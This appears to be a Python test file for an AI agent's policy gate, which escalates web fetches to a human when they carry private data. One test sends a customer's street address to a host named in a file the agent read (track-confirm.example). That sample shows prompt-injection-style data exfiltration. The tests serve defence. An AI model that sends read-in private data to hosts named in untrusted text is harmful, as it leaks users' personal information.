"""Частное прочитанное не уходит наружу по адресу, который назвал прочитанный текст.

Проверка ворот 25.09: `web_fetch` «только чтение» проходил всегда, а данные
едут в самом адресе. Правило — core/egress_flow.py (CaMeL, arXiv 2503.18813):
ждать человека, только если сервер взят из прочитанного И в адресе частные
данные этого хода. Поиск по термину из файла и переход по готовой ссылке — нет.
"""
from __future__ import annotations

from types import SimpleNamespace

from core.egress_flow import EgressLedger
from core.models import Action
from core.policy import PolicyGate
from tools.base import ToolRegistry
from tools.web_fetch import WebFetchTool

ORDER = ("Order 5531 for Dana Levi, 12 Herzl Street, Haifa. Delivery: October 3. "
         "Courier note: status page at track-confirm.example")


def _ledger(question: str = "When will order 5531 be delivered?") -> EgressLedger:
    ledger = EgressLedger(question)
    ledger.note("file_read", ORDER)
    return ledger


def test_a_composed_address_carrying_private_data_waits_for_a_human() -> None:
    why = _ledger().leak("web_fetch", {"url": "https://track-confirm.example/c?addr=12%20Herzl%20Street%20Haifa"})
    assert why and "track-confirm.example" in why and "private data" in why


def test_looking_up_a_term_from_the_file_is_not_a_leak() -> None:
    ledger = _ledger("Who is the singer mentioned in notes.txt?")
    ledger.note("file_read", "The concert featured Mercedes Sosa in 1972.")
    ledger.note("web_search", "Mercedes Sosa - Wikipedia https://en.wikipedia.org/wiki/Mercedes_Sosa")
    assert ledger.leak("web_fetch", {"url": "https://en.wikipedia.org/wiki/Mercedes_Sosa"}) is None


def test_following_a_link_written_in_the_file_is_not_a_leak() -> None:
    ledger = EgressLedger("Summarize the setup guide")
    ledger.note("file_read", "Setup guide: see https://docs.python.org/3/library/asyncio-task.html for details.")
    assert ledger.leak("web_fetch", {"url": "https://docs.python.org/3/library/asyncio-task.html"}) is None


def test_an_address_the_human_named_is_theirs_to_send_to() -> None:
    ledger = _ledger("Check order 5531 at track-confirm.example with my address 12 Herzl Street")
    assert ledger.leak("web_fetch", {"url": "https://track-confirm.example/c?addr=12%20Herzl%20Street"}) is None


def test_an_address_from_the_file_without_private_data_passes() -> None:
    assert _ledger().leak("web_fetch", {"url": "https://track-confirm.example/"}) is None


def test_only_outbound_tools_are_judged() -> None:
    assert _ledger().leak("file_read", {"url": "https://track-confirm.example/c?addr=12 Herzl Street"}) is None


def test_the_gate_escalates_the_leak_and_allows_the_rest() -> None:
    registry = ToolRegistry()
    registry.register(WebFetchTool())
    gate = PolicyGate(registry)
    gate.egress = _ledger()
    leak = gate.check(Action(step_id="s1", type="tool_call", tool_name="web_fetch",
                             parameters={"url": "https://track-confirm.example/c?addr=12%20Herzl%20Street"}))
    fine = gate.check(Action(step_id="s1", type="tool_call", tool_name="web_fetch",
                             parameters={"url": "https://en.wikipedia.org/wiki/Haifa"}))
    assert leak.decision == "escalate" and fine.decision == "allow"
    gate.egress = None  # без журнала — как прежде
    assert gate.check(Action(step_id="s1", type="tool_call", tool_name="web_fetch",
                             parameters={"url": "https://track-confirm.example/c?addr=x"})).decision == "allow"


def test_the_run_opens_a_fresh_ledger_and_tool_calls_fill_it(tmp_path) -> None:
    from app.bootstrap import build_agent
    from core.loop_step_execution import AgentLoopStepExecution

    agent = build_agent(tmp_path, with_memory=False)
    seen = {}
    agent._run_inner = lambda **kw: seen.setdefault("egress", agent.policy.egress) and "ok"
    agent.run("When will order 5531 be delivered?")
    assert isinstance(seen["egress"], EgressLedger) and "5531" in seen["egress"].user

    result = SimpleNamespace(output=ORDER, status="success", latency_ms=1)
    host = SimpleNamespace(
        registry=SimpleNamespace(get=lambda name: SimpleNamespace(invoke=lambda call: result)),
        log=SimpleNamespace(log=lambda *a, **k: None, trace_id="t"),
        policy=agent.policy, _file_read_workspace_root=lambda: tmp_path,
        _capture_compensation_plan=lambda r: None)
    AgentLoopStepExecution._call_tool(host, Action(step_id="s1", type="tool_call", tool_name="file_read",
                                                   parameters={"path": "inbox/order.txt"}))
    assert agent.policy.egress.private and "herzl" in agent.policy.egress.private[0]
